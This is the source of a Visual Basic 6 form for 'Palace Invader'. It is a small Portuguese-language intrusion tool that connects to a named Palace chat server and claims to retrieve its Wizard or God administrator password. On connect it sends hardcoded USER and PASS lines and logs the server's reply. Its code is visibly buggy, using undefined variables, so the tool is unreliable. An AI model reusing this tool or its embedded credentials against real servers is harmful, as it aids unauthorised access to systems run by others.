VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "mswinsck.ocx"
Begin VB.Form Form1 
   BackColor       =   &H00E0E0E0&
   BorderStyle     =   0  'None
   Caption         =   "Palace Invader by 7£r@bY7£"
   ClientHeight    =   5625
   ClientLeft      =   630
   ClientTop       =   630
   ClientWidth     =   6750
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   Picture         =   "Form1.frx":2CFA
   ScaleHeight     =   5625
   ScaleWidth      =   6750
   ShowInTaskbar   =   0   'False
   Begin VB.TextBox log 
      Appearance      =   0  'Flat
      BorderStyle     =   0  'None
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   9.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   1140
      Left            =   315
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      TabIndex        =   2
      Top             =   1740
      Width           =   4635
   End
   Begin VB.TextBox txthost 
      Appearance      =   0  'Flat
      BackColor       =   &H00FFFFFF&
      BorderStyle     =   0  'None
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   240
      Left            =   330
      TabIndex        =   1
      Text            =   "jardins.fastpalaces.com"
      Top             =   3735
      Width           =   4605
   End
   Begin VB.TextBox txtPort 
      BackColor       =   &H00FFFFFF&
      BorderStyle     =   0  'None
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00000000&
      Height          =   240
      Left            =   360
      TabIndex        =   0
      Text            =   "9998"
      Top             =   4650
      Width           =   1155
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   5000
      Left            =   3930
      Top             =   480
   End
   Begin MSWinsockLib.Winsock w1 
      Left            =   2775
      Top             =   60
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Image Image3 
      Height          =   615
      Left            =   6150
      ToolTipText     =   "Sai do programa..."
      Top             =   0
      Width           =   600
   End
   Begin VB.Image verdim 
      Height          =   720
      Left            =   7215
      Picture         =   "Form1.frx":7E9B4
      Top             =   5745
      Visible         =   0   'False
      Width           =   1920
   End
   Begin VB.Image Image1 
      Height          =   720
      Left            =   1740
      ToolTipText     =   "Conecta ao servidor escolhido para invadir..."
      Top             =   4395
      Width           =   1920
   End
   Begin VB.Image Command1 
      Height          =   525
      Left            =   7005
      Picture         =   "Form1.frx":831F6
      ToolTipText     =   "Connect to the choiced palace to invade and retrieve the Wizard's and/or God's Password"
      Top             =   2828
      Width           =   510
   End
   Begin VB.Image exi 
      Height          =   615
      Left            =   6135
      Picture         =   "Form1.frx":84070
      Top             =   0
      Visible         =   0   'False
      Width           =   600
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private mCaptionlessWindowMover As CCaptionlessWindowMover
Private Sub Command2_Click()
w1.SendData Text1.Text
End Sub




Private Sub Form_Load()
On Error Resume Next
  Set mCaptionlessWindowMover = New CCaptionlessWindowMover
  Set mCaptionlessWindowMover.Form = Me
If App.PrevInstance = True Then Unload Me
End Sub

Private Sub Form_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
  mCaptionlessWindowMover.HandleMouseDown X, Y
End Sub

Private Sub Form_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
  mCaptionlessWindowMover.HandleMouseMove X, Y
End Sub

Private Sub Form_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
  mCaptionlessWindowMover.HandleMouseUp
End Sub

Private Sub Image1_Click()
On Error GoTo err

If w1.State = 0 Then
log.Text = log.Text & vbCrLf & Time & " Aguarde..."
w1.RemoteHost = txthost.Text
w1.RemotePort = txtPort.Text
w1.Connect txthost.Text, txtPort.Text
Else
log.Text = log.Text & vbCrLf & Time & " Não é possível realizar a operação neste momento..."
End If
err:
If err.Number <> 0 And err.Number <> 13 Then log.Text = log.Text & vbCrLf & err.Number & Time & "Erro: " & err.Description
End Sub

Private Sub Image1_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image1.Picture = verdim.Picture
End Sub

Private Sub Image1_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image1.Picture = LoadPicture("")
End Sub

Private Sub Image2_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image2.Picture = Min.Picture
End Sub

Private Sub Image2_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image2.Picture = LoadPicture("")
End Sub

Private Sub Image3_Click()
If MsgBox("Deseja mesmo sair do programa??", vbYesNo + vbQuestion, "Palace Invader") = vbYes Then
Unload Me
End If
End Sub

Private Sub Image3_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image3.Picture = exi.Picture
End Sub

Private Sub Image3_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Image3.Picture = LoadPicture("")
End Sub

Private Sub log_Change()
log.SelStart = Len(log.Text)
End Sub

Private Sub Timer1_Timer()
Select Case w1.State
Case Is = 0
log.Text = log.Text & vbCrLf & Time & " >> SOCKET Fechado"
Case Is = 1
log.Text = log.Text & vbCrLf & Time & " >> SOCKET Aberto"
Case Is = 2
log.Text = log.Text & vbCrLf & Time & " >> SOCKET Aguardando Conexão de Cliente..."
Case Is = 3
log.Text = log.Text & vbCrLf & Time & " >> Conexão pendente..."
Case Is = 4
log.Text = log.Text & vbCrLf & Time & " >> Resolvendo host..."
Case Is = 5
log.Text = log.Text & vbCrLf & Time & " >> Host Resolvido"
Case Is = 6
log.Text = log.Text & vbCrLf & Time & " >> SOCKET Conectando..."
Case Is = 8
log.Text = log.Text & vbCrLf & Time & " >> Ponto fechando conexão..."
Case Is = 9
log.Text = log.Text & vbCrLf & Time & " >> Erro de SOCKET"
  '0  ->  Closed
  '1  ->  Open
  '2  ->  Listening
  '3  ->  Connection pending
  '4  ->  Resolving host
  '5  ->  Host resolved
  '6  ->  Connecting
  '7  ->  Connected
  '8  ->  Peer is closing the connection
  '9  ->  Error
  End Select
End Sub

Private Sub w1_Close()
log.Text = log.Text & vbCrLf & "<DESCONECTADO> às " & Time
End Sub

Private Sub w1_Connect()
Dim user As String
Dim pass As String
user = "> USER megaaccesshp"
pass = "> PASS 131733"
Command1.Enabled = False
log.Text = log.Text & vbCrLf & "<CONECTADO> às " & Time
w1.SendData user
w1.SendData pass
End Sub

Private Sub w1_DataArrival(ByVal bytesTotal As Long)
On Error Resume Next
Dim pass As String
w1.GetData pass
If pass <> Empty Then log.Text = log.Text & vbCrLf & password

log.Text = log.Text & vbCrLf & "Bytes Totais Recebidos: " & bytesTotal & " às " & Time
End Sub

Private Sub w1_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
log.Text = log.Text & vbCrLf & "Erro: " & Description & " Nº: " & Number
w1.Close
log.Text = log.Text & vbCrLf & "<Socket Fechado> às " & Time
Command1.Enabled = True
End Sub

Private Sub w1_SendComplete()
log.Text = log.Text & vbCrLf & "Envio Concluído! " & Time
End Sub
